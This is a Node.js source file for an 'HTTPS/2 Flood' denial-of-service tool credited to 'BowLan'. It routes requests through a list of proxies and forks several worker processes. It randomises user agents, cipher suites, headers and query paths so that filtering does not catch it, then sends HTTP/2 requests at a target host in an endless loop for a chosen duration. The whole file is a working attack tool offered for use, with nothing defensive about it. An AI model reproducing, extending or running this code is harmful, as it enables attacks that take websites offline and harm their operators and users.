
/**
HTTPS/2 Flood ~~ Method & Edit | BowLan
Telegram: https://t.me/Bowlan/
*/ 

const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
net = require('net'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
colors = require('colors');


method = [ "GET","HEAD","POST","OPTIONS"],
cplist = [
	"RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
	"options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
	"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],

patht = [
	"?s=",
	"#",
	"$",
	"?true=",
	" ",
	"?q=",
	"?false=",
	"",
	"  ",
	"?"
],

encoding_header = [
    'deflate, gzip, br',
    'gzip, br',
	'deflate,gzip',
	'deflate',
	'br'
],
control_header = [
    'no-cache',
    'max-age=0'
],
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).setMaxListeners(0);
function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}


function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return control_header[Math.floor(Math.random() * control_header.length)];
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}

function randstr(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

function dataed(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
     return result;
}

   
if (process.argv.length < 8){
	console.log('	');
    console.log('		HTTPS/2 Floodv5 (HTTPS Only) | Method by BowLan '.green.bold);
	console.log('	');
    console.log('Usage: node file_name <GET/HEAD> <host> <proxies> <duration> <rate<64> <thread(1-3)>	');
    //console.log(process.argv.length);
    process.exit(0);
}

var rate = process.argv[6];
var method = process.argv[2];

var proxys = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}
if(cluster.isMaster) {
const dateObj = new Date();
    for(var bb=0;bb<process.argv[6];bb++) {
        cluster.fork();
    }
	console.log('	Attacking | Method-v5 By BowLan');
    setTimeout(() => {
		console.log('	Attack ended.'.green.bold);
        process.exit(-1)
    }, process.argv[5] * 1000)
}else {
    function flood() {
        var parsed = url.parse(process.argv[3]);
        const uas = fakeua();
        var cipper = cipher()
        var proxy = proxyr().split(':')
		var data = dataed(4)
        var header = {
			":method": method,
			":scheme": "https",
            ":path": parsed.path + patht[Math.floor((Math.random() * patht.length))] + randstr(25),
			"Referer": parsed.path,
			"User-agent": uas,
            "X-Forwarded-For": proxy[0], 
			"Upgrade-Insecure-Requests": "1",
            "Accept-encoding": accept(),
            "Cache-Control": controling(),
        }
        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 10000,
            maxSockets: Infinity,
        });
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
			timeout: 10000,
			ciphers: cipper,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host+':443'
        }, function(){ 
            req.setSocketKeepAlive(true);
        });
        req.on('connect', function (res, socket, head) { 
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: cipper, 
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
					challengesToSolve: 5,
					clientTimeout: Infinity,
					clientlareMaxTimeout: Infinity,
					maxRedirects: Infinity,
					gzip: false,
					decodeEmails: false,
					honorCipherOrder: true,
					requestCert: true,
					port: 443,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: socket
					//sessionTimeout: 10000,
                }, function () {
                    for (let i = 0; i< rate; i++){
                        const req = client.request(header);
                        req.setEncoding('utf8');
                        req.on('data', (chunked)=> {
                            // data += chunked();
                        });
                        req.on("response", () => {
                            req.close();
                        })
                        req.end();
                    }
                })
            });
        });
        req.end();
    }
    setInterval(() => { flood() })
  }
